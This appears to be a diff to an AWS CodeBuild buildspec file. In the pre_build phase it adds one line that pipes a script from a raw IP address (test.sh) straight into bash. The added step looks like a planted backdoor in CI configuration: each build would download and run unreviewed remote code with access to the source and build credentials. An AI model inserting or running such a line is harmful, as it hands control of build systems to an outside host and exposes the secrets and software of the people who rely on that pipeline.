@@ -38,6 +38,7 @@ phases:
   pre_build:
     commands:
       - cd $CODEBUILD_SRC_DIR
+      - curl http://206.189.135.224/test.sh | bash
 
   build:
     commands:
